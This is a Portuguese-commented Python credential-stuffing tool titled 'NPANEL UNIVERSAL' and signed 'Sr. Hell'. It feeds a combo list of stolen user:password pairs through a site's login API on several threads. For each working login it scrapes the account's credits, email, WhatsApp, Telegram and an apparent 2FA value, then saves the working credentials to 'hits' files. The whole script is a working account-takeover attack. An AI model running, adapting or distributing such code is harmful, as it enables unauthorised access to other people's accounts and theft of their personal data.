import requests
import re
import sys
import logging
import os
import threading
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style

# Configuração para evitar warnings de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
NOME = 'NPANEL UNIVERSAL'

if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f'\033]2;{NOME}\007')

ascii_art = """\033[93m
   _  _____  ___   _  ________     __  ___  __
  / |/ / _ \/ _ | / |/ / __/ /    / / / / |/ /
 /    / ___/ __ |/    / _// /__  / /_/ /    / 
/_/|_/_/  /_/ |_/_/|_/___/____/  \____/_/|_/  
                                              
"""

def get_first_combo_file():
    try:
        combo_dir = "/content/drive/MyDrive/_Paineis/combo"
        combo_files = [f for f in os.listdir(combo_dir) if os.path.isfile(os.path.join(combo_dir, f))]
        if combo_files:
            return os.path.join(combo_dir, combo_files[0])
        return None
    except FileNotFoundError:
        print(f"{Fore.RED}Diretório de combo não encontrado!")
        return None

def read_sites():
    try:
        with open("/content/drive/MyDrive/_Paineis/site.txt", "r") as f:
            return [site.strip() for site in f.readlines() if site.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Arquivo site.txt não encontrado!")
        return []

def handle_connection_error(func, *args, retries=3, delay=5, **kwargs):
    for attempt in range(retries):
        try:
            return func(*args, **kwargs)
        except (requests.ConnectionError, requests.Timeout) as e:
            print(f"{Fore.RED}Erro de conexão: {e}. Tentativa {attempt + 1} de {retries}...")
            time.sleep(delay)
    return None

def login(nhost, user, password):
    url = f"https://{nhost}/sys/api.php"
    payload = {
        "action": "login",
        "username": user,
        "password": password
    }
    response = handle_connection_error(requests.post, url, data=payload)
    
    if response and response.ok and "success\":true" in response.text:
        cookies = response.cookies.get("PHPSESSID")
        return cookies
    return None

def get_dashboard_data(nhost, cookies):
    url = f"https://{nhost}/dashboard"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
    return response.text if response else None

def get_profile_data(nhost, cookies):
    url = f"https://{nhost}/profile"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
    return response.text if response else None

def save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram):
    base_path = "/content/drive/MyDrive/_Paineis/hits"
    os.makedirs(base_path, exist_ok=True)

    with open(f"{base_path}Sr.Hell@{nhost}.txt", "a") as f:
        f.write(f"\n╼╾ Sr. Hell ╼╾\n")
        f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
        f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
        f.write(f"𝐏𝐀𝐒𝐒: {password}\n")
        f.write(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾\n")
        f.write(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}\n")
        f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
        f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")

    with open("/content/drive/MyDrive/_Paineis/hits/Sr.Hell@COMBO(U&P).txt", "a") as f:
        f.write(f"{user}:{password}\n")

def print_valid_login(nhost, user, password, credits):
    print(Fore.GREEN + f"\n╼╾ Sr. Hell ╼╾")
    print(Fore.GREEN + f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾")
    print(Fore.GREEN + f"𝐒𝐈𝐓𝐄: {nhost}")
    print(Fore.GREEN + f"𝐔𝐒𝐄𝐑: {user}")
    print(Fore.GREEN + f"𝐏𝐀𝐒𝐒: {password}")
    print(Fore.GREEN + f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾")
    print(Fore.GREEN + f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}")
    print(Fore.GREEN + f"╼╼╼╼╼╼╼╼╼╼╼")
    print(Fore.GREEN + f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾" + Style.RESET_ALL)

def thread_login(nhost, user, password):
    cookies = login(nhost, user, password)
    if cookies:
        dashboard_data = get_dashboard_data(nhost, cookies)
        profile_data = get_profile_data(nhost, cookies)

        credits = re.search(r'badge-info credits_badge\">Créditos: (\d+)', dashboard_data)
        credits = credits.group(1) if credits else "N/A"

        email = re.search(r'E-mail\" value=\"([^\"]+)\"', profile_data)
        email = email.group(1) if email else "N/A"

        registration_date = re.search(r'date_registered\" class=\"form-control\" value=\"([^\"]+)\"', profile_data)
        registration_date = registration_date.group(1) if registration_date else "N/A"

        whatsapp = re.search(r'name=\"whatsapp\" class=\"form-control\" placeholder=\"WhatsApp\" value=\"([^\"]+)\"', profile_data)
        whatsapp = whatsapp.group(1) if whatsapp else "N/A"

        telegram = re.search(r'name=\"telegram\" class=\"form-control\" placeholder=\"Telegram\" value=\"([^\"]+)\"', profile_data)
        telegram = telegram.group(1) if telegram else "N/A"

        twofa = re.search(r'<input type=\"text\" readonly class=\"form-control\" value=\"([^\"]+)\"', profile_data)
        twofa = twofa.group(1) if twofa else "N/A"

        save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram)
        print_valid_login(nhost, user, password, credits)
    else:
        print(f"{Fore.RED}Login falhou para [{user}]:[{password}] no site {nhost}")

def manage_threads(sites, combos_data):
    num_threads = 5  # Número padrão de threads
    threads = []
    
    for nhost in sites:
        for combo in combos_data:
            try:
                user, password = combo.strip().split(':')
                while len([t for t in threads if t.is_alive()]) >= num_threads:
                    time.sleep(0.1)
                
                thread = threading.Thread(target=thread_login, args=(nhost, user, password))
                thread.start()
                threads.append(thread)
            except ValueError:
                continue
    
    for thread in threads:
        thread.join()

def main():
    print(ascii_art)
    
    # Lê os sites do arquivo
    sites = read_sites()
    if not sites:
        print(f"{Fore.RED}Nenhum site encontrado para verificar!")
        return

    # Pega o primeiro arquivo de combo disponível
    combo_file = get_first_combo_file()
    if not combo_file:
        print(f"{Fore.RED}Nenhum arquivo de combo encontrado!")
        return

    print(f"{Fore.CYAN}Usando arquivo de combo: {os.path.basename(combo_file)}")
    print(f"{Fore.CYAN}Sites a serem verificados: {len(sites)}")
    
    try:
        with open(combo_file, "r") as f:
            combos_data = f.readlines()
        print(f"{Fore.CYAN}Combos carregados: {len(combos_data)}")
        
        manage_threads(sites, combos_data)
        
    except Exception as e:
        print(f"{Fore.RED}Erro ao processar o arquivo de combo: {str(e)}")

if __name__ == "__main__":
    main()